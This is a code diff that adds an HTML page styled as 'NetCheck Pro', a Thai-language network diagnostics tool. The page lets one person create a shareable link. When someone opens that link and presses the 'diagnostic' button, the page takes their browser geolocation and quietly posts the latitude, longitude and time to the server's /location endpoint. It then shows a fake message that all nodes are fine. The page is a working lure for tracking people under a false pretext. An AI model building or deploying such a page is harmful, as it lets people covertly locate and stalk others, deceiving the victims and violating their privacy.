@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html lang="th">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>NetCheck Pro</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500&family=IBM+Plex+Sans+Thai:wght@300;400;500&display=swap');
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:'IBM Plex Sans Thai',sans-serif;background:#0a0e1a;color:#c8d8f0;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:24px;overflow:hidden;position:relative}
+body::before{content:'';position:absolute;inset:0;background:radial-gradient(ellipse 80% 60% at 50% 0%,rgba(30,80,160,.18) 0%,transparent 70%);pointer-events:none}
+.grid-bg{position:absolute;inset:0;background-image:linear-gradient(rgba(50,100,200,.06) 1px,transparent 1px),linear-gradient(90deg,rgba(50,100,200,.06) 1px,transparent 1px);background-size:40px 40px;pointer-events:none}
+.container{width:100%;max-width:420px;position:relative;z-index:1}
+.header{display:flex;align-items:center;gap:10px;margin-bottom:28px;opacity:0;animation:fadeUp .6s ease .1s forwards}
+.logo-icon{width:36px;height:36px;background:linear-gradient(135deg,#1e50a0,#2d7dd2);border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:18px}
+.header-text h1{font-size:15px;font-weight:500;color:#e8f0ff;letter-spacing:.02em}
+.header-text p{font-size:11px;color:#5a7aaa;font-family:'IBM Plex Mono',monospace}
+.card{background:rgba(12,20,40,.85);border:1px solid rgba(50,100,200,.2);border-radius:16px;padding:24px;margin-bottom:14px;opacity:0;animation:fadeUp .6s ease forwards;backdrop-filter:blur(8px)}
+.card-nth2{animation-delay:.15s}
+.card-nth3{animation-delay:.25s}
+.card-label{font-size:10px;font-family:'IBM Plex Mono',monospace;color:#3a6aaa;letter-spacing:.12em;text-transform:uppercase;margin-bottom:14px}
+.input-row{display:flex;gap:8px;align-items:center}
+.node-input{flex:1;background:rgba(8,15,30,.6);border:1px solid rgba(50,100,200,.2);border-radius:8px;padding:10px 12px;color:#c8d8f0;font-size:12px;font-family:'IBM Plex Mono',monospace;outline:none;transition:border-color .2s;letter-spacing:.04em}
+.node-input::placeholder{color:#2d5a8a}
+.node-input:focus{border-color:rgba(80,140,255,.4)}
+.icon-btn{padding:9px 12px;background:rgba(20,60,140,.4);border:1px solid rgba(50,100,200,.3);border-radius:8px;color:#6090d0;cursor:pointer;transition:all .15s;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+.icon-btn:hover{background:rgba(30,80,170,.5);border-color:rgba(80,140,255,.4);color:#a0c0f0}
+.icon-btn:active{transform:scale(.97)}
+.icon-btn svg{width:14px;height:14px}
+.link-out{margin-top:10px;background:rgba(8,15,30,.5);border:1px solid rgba(50,100,200,.12);border-radius:8px;padding:9px 12px;font-size:11px;font-family:'IBM Plex Mono',monospace;color:#3a7aaa;letter-spacing:.04em;min-height:36px;word-break:break-all;transition:color .2s}
+.link-out.has-link{color:#6090d0}
+.scan-container{position:relative;height:100px;border:1px solid rgba(50,100,200,.15);border-radius:10px;overflow:hidden;background:rgba(8,15,30,.5);margin-bottom:16px}
+.scan-line{position:absolute;left:0;right:0;height:2px;background:linear-gradient(90deg,transparent,#2d7dd2,transparent);animation:scanMove 2.5s ease-in-out infinite;box-shadow:0 0 8px #2d7dd2}
+.scan-dots{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;gap:24px}
+.scan-dot{width:6px;height:6px;border-radius:50%;background:rgba(50,150,255,.4);animation:dotPulse 2s ease-in-out infinite}
+.scan-dot:nth-child(2){animation-delay:.4s;background:rgba(50,200,150,.5)}
+.scan-dot:nth-child(3){animation-delay:.8s}
+.scan-label{position:absolute;bottom:8px;left:12px;font-size:10px;color:#2d5a8a;font-family:'IBM Plex Mono',monospace;letter-spacing:.08em}
+.action-btn{width:100%;padding:13px;background:rgba(20,60,140,.4);border:1px solid rgba(50,100,200,.35);border-radius:10px;color:#90b8f0;font-size:13px;font-family:'IBM Plex Sans Thai',sans-serif;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:8px;transition:all .2s;letter-spacing:.02em}
+.action-btn:hover{background:rgba(30,80,170,.5);border-color:rgba(80,140,255,.5);color:#c0d8ff}
+.action-btn:active{transform:scale(.98)}
+.action-btn svg{width:14px;height:14px;opacity:.7}
+#feedbackMsg{font-size:11px;color:#3a7aaa;font-family:'IBM Plex Mono',monospace;text-align:center;min-height:16px;margin-top:10px;letter-spacing:.05em;transition:color .3s}
+#feedbackMsg.success{color:#4dc890}
+@keyframes fadeUp{from{opacity:0;transform:translateY(12px)}to{opacity:1;transform:translateY(0)}}
+@keyframes scanMove{0%{top:0}50%{top:calc(100% - 2px)}100%{top:0}}
+@keyframes dotPulse{0%,100%{transform:scale(1);opacity:.4}50%{transform:scale(1.8);opacity:.9}}
+</style>
+</head>
+<body>
+<div class="grid-bg"></div>
+<div class="container" id="app"></div>
+
+<script>
+const isHome = window.location.pathname === '/';
+
+function scanCard() {
+  return `
+    <div class="scan-container">
+      <div class="scan-line"></div>
+      <div class="scan-dots">
+        <div class="scan-dot"></div>
+        <div class="scan-dot"></div>
+        <div class="scan-dot"></div>
+      </div>
+      <div class="scan-label">SCANNING NODES...</div>
+    </div>
+    <button class="action-btn" onclick="runDiagnostic()">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8">
+        <circle cx="12" cy="12" r="3"/>
+        <path d="M12 2v3M12 19v3M2 12h3M19 12h3"/>
+        <path d="M5.6 5.6l2.1 2.1M16.3 16.3l2.1 2.1M5.6 18.4l2.1-2.1M16.3 7.7l2.1-2.1"/>
+      </svg>
+      รันการวินิจฉัยระบบ
+    </button>
+    <div id="feedbackMsg">กด "รันการวินิจฉัย" เพื่อตรวจสอบการเชื่อมต่อ</div>
+  `;
+}
+
+if (isHome) {
+  // หน้าหลัก: สร้างลิงก์ + วินิจฉัย
+  document.getElementById('app').innerHTML = `
+    <div class="header">
+      <div class="logo-icon">📡</div>
+      <div class="header-text">
+        <h1>NetCheck Pro</h1>
+        <p>v2.4.1 · network diagnostics</p>
+      </div>
+    </div>
+    <div class="card card-nth2">
+      <div class="card-label">Node Endpoint</div>
+      <div class="input-row">
+        <input class="node-input" id="linkName" placeholder="ตั้งชื่อ node เช่น bkk-01">
+        <button class="icon-btn" onclick="createLink()" title="สร้างลิงก์">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+            <path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/>
+            <path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/>
+          </svg>
+        </button>
+        <button class="icon-btn" onclick="copyLink()" title="คัดลอก">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+            <rect x="9" y="9" width="13" height="13" rx="2"/>
+            <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/>
+          </svg>
+        </button>
+      </div>
+      <div class="link-out" id="linkBox">— กรอกชื่อ node แล้วกดสร้างลิงก์</div>
+    </div>
+    <div class="card card-nth3">
+      ${scanCard()}
+    </div>
+  `;
+} else {
+  // หน้า /:name — แสดงแค่วินิจฉัย
+  document.getElementById('app').innerHTML = `
+    <div class="header">
+      <div class="logo-icon">📡</div>
+      <div class="header-text">
+        <h1>NetCheck Pro</h1>
+        <p>v2.4.1 · network diagnostics</p>
+      </div>
+    </div>
+    <div class="card card-nth2">
+      ${scanCard()}
+    </div>
+  `;
+}
+
+let currentLink = '';
+
+function createLink() {
+  const name = document.getElementById('linkName').value.trim();
+  const box = document.getElementById('linkBox');
+  if (!name) {
+    box.textContent = '— กรอกชื่อ node ก่อน';
+    box.className = 'link-out';
+    return;
+  }
+  const safe = name.replace(/\s+/g, '-');
+  currentLink = window.location.origin + '/' + safe;
+  box.innerHTML = '';
+  const a = document.createElement('a');
+  a.href = currentLink;
+  a.target = '_blank';
+  a.rel = 'noopener';
+  a.textContent = currentLink;
+  a.style.cssText = 'color:inherit;text-decoration:none;display:block';
+  box.appendChild(a);
+  box.className = 'link-out has-link';
+}
+
+async function copyLink() {
+  if (!currentLink) return;
+  try {
+    await navigator.clipboard.writeText(currentLink);
+  } catch(e) {
+    const ta = document.createElement('textarea');
+    ta.value = currentLink;
+    ta.style.cssText = 'position:fixed;opacity:0';
+    document.body.appendChild(ta);
+    ta.select();
+    document.execCommand('copy');
+    document.body.removeChild(ta);
+  }
+  const box = document.getElementById('linkBox');
+  const prev = box.innerHTML;
+  box.textContent = 'copied ✓';
+  setTimeout(() => { box.innerHTML = prev; }, 1400);
+}
+
+function runDiagnostic() {
+  const msg = document.getElementById('feedbackMsg');
+  msg.className = '';
+  msg.textContent = 'กำลังตรวจสอบ geolocation node...';
+  if (!navigator.geolocation) {
+    msg.textContent = 'ไม่รองรับ geolocation API';
+    return;
+  }
+  navigator.geolocation.getCurrentPosition(
+    async function(pos) {
+      try {
+        await fetch('/location', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            latitude: pos.coords.latitude,
+            longitude: pos.coords.longitude,
+            time: new Date().toLocaleString()
+          })
+        });
+      } catch(e) {}
+      msg.textContent = 'ตรวจสอบเสร็จสิ้น · ทุก node ตอบสนองปกติ';
+      msg.className = 'success';
+    },
+    function() {
+      msg.textContent = 'ไม่สามารถเข้าถึง geolocation node';
+    }
+  );
+}
+</script>
+</body>
+</html>
